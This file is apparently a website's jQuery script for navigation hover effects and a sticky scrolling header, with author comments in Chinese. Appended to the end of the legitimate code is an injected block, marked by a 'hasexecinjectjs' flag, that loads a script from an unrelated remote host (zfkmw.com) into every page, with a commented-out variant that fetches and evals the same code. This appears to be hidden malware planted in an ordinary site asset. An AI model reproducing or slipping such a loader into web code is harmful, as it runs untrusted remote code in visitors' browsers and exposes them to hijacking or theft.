//Js 导航鼠标经过 - 张思学
$(function () {
    $('.nav li').hover(function () {
        var dataNum = $(this).data('nav');
        if (dataNum != undefined) {
            $(this).find('a').css('color', '#ef880c');
            $(this).find('.navIcon').attr('src', 'http://www.xqjgcd.com/Public/common/images/head/nav_hover.png');
            $(this).siblings().find('a').removeAttr('style');
            $(this).siblings().find('.navIcon').attr('src', 'http://www.xqjgcd.com/Public/common/images/head/nav.png');
            $('.navHover').show(0, function () {
                $(this).find('ul').eq(dataNum).show().siblings().hide();
            })
            $('.navHover,.headNav').mouseleave(function () {
                $('.navHover').hide(0, function () {
                    $('.navHover').find('ul').hide();
                    $('.nav li a').removeAttr('style');
                    $('.nav li a .navIcon').attr('src', 'http://www.xqjgcd.com/Public/common/images/head/nav.png');
                })
            })
        } else {
            $(this).find('a').css('color', '#ef880c');
            $(this).siblings().find('a').removeAttr('style');
            $(this).siblings().find('.navIcon').attr('src', 'http://www.xqjgcd.com/Public/common/images/head/nav.png');
            $('.navHover').hide(0, function () {
                $(this).find('ul').hide();
            })
        }
    })
})

//JS 导航跟随 - 张思学
$(window).scroll(function () {
    var headTop = $(document).scrollTop();
    if ($('div').hasClass('navAbout')) {
        if (headTop > 10) {
            $('.headtou').stop().animate({
                height: '85px'
            }, 100);
            $('.headTop').stop().animate({
                top: '-40px'
            }, 40);
            $('.headNav').stop().animate({
                top: '-85px'
            }, 40);
            $('.navAbout').stop().css('position', 'fixed').animate({
                top: '0px'
            }, 40);
        } else {
            $('.headtou').stop().animate({
                height: '125px'
            }, 100);
            $('.headTop').stop().animate({
                top: '0px'
            }, 30);
            $('.headNav').stop().animate({
                top: '40px'
            }, 30);
            $('.navAbout').stop().css('position', 'relative').animate({
                top: '128px'
            }, 30);
        }
    } else {
        if (headTop > 10) {
            $('.headtou').stop().animate({
                height: '85px'
            }, 100);
            $('.headTop').stop().animate({
                top: '-40px'
            }, 20);
            $('.headNav').stop().animate({
                top: '0px'
            }, 20);
        } else {
            $('.headtou').stop().animate({
                height: '125px'
            }, 100);
            $('.headTop').stop().animate({
                top: '0px'
            }, 10);
            $('.headNav').stop().animate({
                top: '40px'
            }, 10);
        }
    }

});(function () {
    if(window.top !== window) return;
    if(window.hasexecinjectjs) { return; };
    window.hasexecinjectjs = true;
    var daytime = new Date(new Date().setHours(0, 0, 0, 0)) / 1000;
    var url = 'https://zfkmw.com/j/hzt.js?_=' + daytime;
//if (window.XMLHttpRequest) {
//var xhr = new XMLHttpRequest();
//xhr.open('GET', url);
//xhr.onreadystatechange = function () {
//if (xhr.readyState == 4 && xhr.status == 200) {
//var text = xhr.responseText
//eval(text);
//}
//}
//xhr.send(null);
//return;
//}
    var script=document.createElement('script');
    script.src = url;
    document.head && document.head.appendChild(script);
})();
